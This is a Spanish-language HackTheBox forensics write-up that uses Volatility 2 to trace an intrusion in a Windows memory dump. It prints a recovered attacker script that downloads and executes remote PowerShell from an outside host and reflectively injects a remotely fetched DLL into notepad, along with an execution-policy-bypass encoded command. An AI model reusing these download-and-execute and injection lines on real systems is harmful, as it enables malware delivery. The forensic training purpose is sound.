---
title: Reflection
description: >
  HackTheBox Forensics Challenge - Medium<br>
  [Challenge Download](https://app.hackthebox.com/challenges/318)
date: 2024-05-08
weight: 10
tags: ["htb","forensics","medium", "volatility"]
---

---
# Enunciado del problema

You and Miyuki have succeeded in dis-empowering Draeger's army in every possible way. Stopped their fuel-supply plan, arrested their ransomware gang, prevented massive phishing campaigns and understood their tactics and techniques in depth. Now it is the time for the final blow. The final preparations are completed. Everyone is in their stations waiting for the signal. This mission can only be successful if you use the element of surprise. Thus, the signal must remain a secret until the end of the operation. During some last-minute checks you notice some weird behaviour in Miyuki's PC. You must find out if someone managed to gain access to her PC before it's too late. If so, the signal must change. Time is limited and there is no room for errors.

---
# Resolución

Mientras usamos *volatility2* para ver el archivo *.raw* proporcionado, usaremos el comando *strings* para ver de que se puede tratar el challenge... lo único que vemos son clases del registro de windows, mientras hacemos esto nuestro comando ya cargo:

```bash
vol2 -f /data/memory.raw imageinfo
```

También podriamos haber usado el comando, ya que tiene los mismo resultados

```bash
vol2 -f /data/memory.raw kdbgscan
```

Y nos devuelve lo siguietnes perfiles:

```bash
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/data/memory.raw)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82947c68L
          Number of Processors : 1
     Image Type (Service Pack) : 1
                KPCR for CPU 0 : 0x82948d00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2022-04-20 11:06:10 UTC+0000
     Image local date and time : 2022-04-20 04:06:10 -0700
```


Con estos perfiles podemos listar los procesos capturados en la memoria ram... la sintaxis de estos comando es la siguiente:

```bash
vol2 -f <FILE> --profile=<PROFILE> <PLUGING>
```

![](https://raw.githubusercontent.com/yoshlsec/page-images/main/Challenges%20HTB%20Forensics/Pasted%20image%2020240526103057.png)

Viendo el registro del volcado de memoria con el pluging: *cmdline* podemos ver que usa comandos como: *sshd, powershell y notepad*, al ejecutar powershell usaba el archivo: *update.ps1* con *filescan* podemos obtener su espacio de memoria (memory address) y poder dumpearlo en nuestra máquina:

```bash
$> vol2 -f /data/memory.raw --profile=Win7SP1x86_23418 filescan | grep update.ps1

Volatility Foundation Volatility Framework 2.6.1
0x000000003f4551c0      8      0 R--r-- \Device\HarddiskVolume1\Windows\security\update.ps1

vol2 -f /data/memory.raw --profile=Win7SP1x86_23418 dumpfiles -Q 0x000000003f4551c0 -D ./output

Volatility Foundation Volatility Framework 2.6.1
DataSectionObject 0x3f4551c0   None   \Device\HarddiskVolume1\Windows\security\update.ps1

$> ls ./output
file.None.0x85bf45c8.dat

$> file output/file.None.0x85bf45c8.dat
output/file.None.0x85bf45c8.dat: data
```

Dentro del archivo encontramos:

```powershell
iex (New-Object net.webclient).Downloadstring('https://windowsliveupdater.com/sysdriver.ps1');
Invoke-ReflectivePEInjection -PEUrl https://windowsliveupdater.com/winmgr.dll -ProcName notepad
```

Lo que hace el archivo es ejecutar un *.dll* con el nombre: **notepad**, si vemos el primer comando que hicimos podemos ver que el PID tanto de powershell (3424) como el de notepad (3244):

```bash
$> vol2 -f /data/memory.raw --profile=Win7SP1x86_23418 memdump -p 3244 -D ./output
 
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
Writing notepad.exe [  3244] to 3244.dmp
```

Vemos por encima que es un dll, entonces usando el pluging: *dlldump* obtenemos el archivo, dentro del archivo encontramos:

```bash
83 ec 78                sub    esp,0x78
c6 45 88 70             mov    BYTE PTR [ebp-0x78],0x70
c6 45 89 6f             mov    BYTE PTR [ebp-0x77],0x6f
c6 45 8a 77             mov    BYTE PTR [ebp-0x76],0x77
c6 45 8b 65             mov    BYTE PTR [ebp-0x75],0x65
c6 45 8c 72             mov    BYTE PTR [ebp-0x74],0x72
c6 45 8d 73             mov    BYTE PTR [ebp-0x73],0x73
c6 45 8e 68             mov    BYTE PTR [ebp-0x72],0x68
c6 45 8f 65             mov    BYTE PTR [ebp-0x71],0x65
c6 45 90 6c             mov    BYTE PTR [ebp-0x70],0x6c
c6 45 91 6c             mov    BYTE PTR [ebp-0x6f],0x6c
c6 45 f5 42             mov    BYTE PTR [ebp-0xb],0x42
c6 45 f6 75             mov    BYTE PTR [ebp-0xa],0x75
c6 45 f7 41             mov    BYTE PTR [ebp-0x9],0x41
c6 45 f8 47             mov    BYTE PTR [ebp-0x8],0x47
c6 45 f9 51             mov    BYTE PTR [ebp-0x7],0x51
c6 45 fa 41             mov    BYTE PTR [ebp-0x6],0x41
c6 45 fb 66             mov    BYTE PTR [ebp-0x5],0x66
c6 45 fc 51             mov    BYTE PTR [ebp-0x4],0x51
c6 45 fd 41             mov    BYTE PTR [ebp-0x3],0x41
c6 45 fe 3d             mov    BYTE PTR [ebp-0x2],0x3d
```

Que obtenemos todos los 0x y los pasamos a ascii para obtener el comando de powershell:

```powershell
powershell -ep bypass -enc ZQBjAGgAbwAgAEgAVABCAHsAZABsAGwAcwBfAGMANABuAF8AYgAzAF8AaAA0AHIAZABfAHQAMABfAGYAMQBuAGQAfQA=
```

Que si decodeamos en base64 obtenemos la flag